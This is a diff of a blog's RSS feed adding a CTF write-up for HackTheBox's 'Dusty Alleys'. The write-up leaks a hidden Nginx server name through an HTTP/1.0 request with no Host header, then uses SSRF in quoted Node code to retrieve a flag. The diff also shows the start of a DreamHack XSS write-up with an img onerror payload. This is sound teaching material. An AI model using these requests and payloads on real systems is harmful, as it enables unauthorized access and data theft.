@@ -1,4 +1,78 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>minhi1</title><description>blogs</description><link>https://minhi1.github.io/</link><language>en</language><item><title>DreamHack - [Buffalo Wings challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-5/buffalo-wings/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-5/buffalo-wings/</guid><description>Writeup for the Buffalo Wings challenge (level 5)</description><pubDate>Sun, 11 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In &lt;code&gt;index.php&lt;/code&gt;, the &lt;code&gt;echo&lt;/code&gt; command is called before calling &lt;code&gt;header()&lt;/code&gt; function.
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>minhi1</title><description>blogs</description><link>https://minhi1.github.io/</link><language>en</language><item><title>HackTheBox - [Dusty Alleys challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/htb/medium/dusty-alleys/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/htb/medium/dusty-alleys/</guid><description>Writeup for the Dusty Alleys challenge (level Medium)</description><pubDate>Mon, 12 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Challenge Overview&lt;/h2&gt;
+&lt;p&gt;We are provided with an Nginx configuration file and a &lt;code&gt;guardian.js&lt;/code&gt; source file. The goal is to access the &lt;code&gt;/guardian&lt;/code&gt; endpoint, which is protected by a secret server name (&lt;code&gt;$SECRET_ALLEY&lt;/code&gt;), and then exploit a logic flaw to retrieve the flag.&lt;/p&gt;
+&lt;h2&gt;Step 1: Leaking the Secret Domain (Nginx Misconfiguration)&lt;/h2&gt;
+&lt;h3&gt;Analysis&lt;/h3&gt;
+&lt;p&gt;The Nginx config defines two servers:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;alley.$SECRET_ALLEY&lt;/code&gt; (Default server)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;guardian.$SECRET_ALLEY&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;To access the guardian, we first need to know the random string &lt;code&gt;$SECRET_ALLEY&lt;/code&gt;.
+Looking at the default server config:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;location /think { 
+    proxy_pass http://localhost:1337;
+    proxy_set_header Host $host;
+    ...
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The variable &lt;code&gt;$host&lt;/code&gt; in Nginx behaves in a specific way: if the client provides a &lt;code&gt;Host&lt;/code&gt; header, it uses that. If the client &lt;strong&gt;does not&lt;/strong&gt; provide a &lt;code&gt;Host&lt;/code&gt; header, Nginx defaults to using the &lt;code&gt;server_name&lt;/code&gt; from the config. &lt;a href=&quot;https://nginx.org/en/docs/http/ngx_http_core_module.html#var_host&quot;&gt;document&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Exploit&lt;/h3&gt;
+&lt;p&gt;Not specifying the Host header in HTTP/1.1 is impossible. So we can &lt;strong&gt;downgrade&lt;/strong&gt; the protocol to HTTP/1.0, which allows non-host header.
+We can force Nginx to reveal its internal &lt;code&gt;server_name&lt;/code&gt; by sending an HTTP/1.0 request to the &lt;code&gt;/think&lt;/code&gt; endpoint.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GET /think HTTP/1.0
+No host header here
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The backend code for &lt;code&gt;/think&lt;/code&gt; returns &lt;code&gt;req.headers&lt;/code&gt;. Because we sent no Host header, Nginx filled it with the secret server name.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{
+  &quot;host&quot;: &quot;alley.***.htb&quot;,
+  ...
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Step 2: SSRF via The Guardian&lt;/h2&gt;
+&lt;h3&gt;Analysis&lt;/h3&gt;
+&lt;p&gt;Now that we can address the &lt;code&gt;guardian&lt;/code&gt; server. In the source code for &lt;code&gt;/guardian&lt;/code&gt; endpoint, it checks if hostname of the input URL is localhost. Then it fetches data from the URL and print out to the browser.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;router.get(&quot;/guardian&quot;, async (req, res) =&amp;gt; {
+  const quote = req.query.quote;
+
+  if (!quote) return res.render(&quot;guardian&quot;);
+
+  try {
+    const location = new URL(quote);
+    const direction = location.hostname;
+    if (!direction.endsWith(&quot;localhost&quot;) &amp;amp;&amp;amp; direction !== &quot;localhost&quot;)
+      return res.send(&quot;guardian&quot;, {
+        error: &quot;You are forbidden from talking with me.&quot;,
+      });
+  } catch (error) {
+    return res.render(&quot;guardian&quot;, { error: &quot;My brain circuits are mad.&quot; });
+  }
+
+  try {
+    let result = await node_fetch(quote, {
+      method: &quot;GET&quot;,
+      headers: { Key: process.env.FLAG || &quot;HTB{REDACTED}&quot; },
+    }).then((res) =&amp;gt; res.text());
+
+    res.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);
+
+    res.send(result);
+  } catch (e) {
+    console.error(e);
+    return res.render(&quot;guardian&quot;, {
+      error: &quot;The words are lost in my circuits&quot;,
+    });
+  }
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The code also attaches the flag to the request as a header. So we can simply craft a &lt;code&gt;quote&lt;/code&gt; payload.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/guardian?quote=http://localhost:1337/think
+Host: guardian.***
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then we can achieve the flag.&lt;/p&gt;
+</content:encoded></item><item><title>DreamHack - [Buffalo Wings challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-5/buffalo-wings/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-5/buffalo-wings/</guid><description>Writeup for the Buffalo Wings challenge (level 5)</description><pubDate>Sun, 11 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In &lt;code&gt;index.php&lt;/code&gt;, the &lt;code&gt;echo&lt;/code&gt; command is called before calling &lt;code&gt;header()&lt;/code&gt; function.
 That might not trigger the CSP header, which can eventually let us execute Javascript code. Let&apos;s verify it.&lt;/p&gt;
 &lt;p&gt;Send a comment payload like below.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;comment = lol&amp;lt;img src=1 onerror=alert(1)&amp;gt;
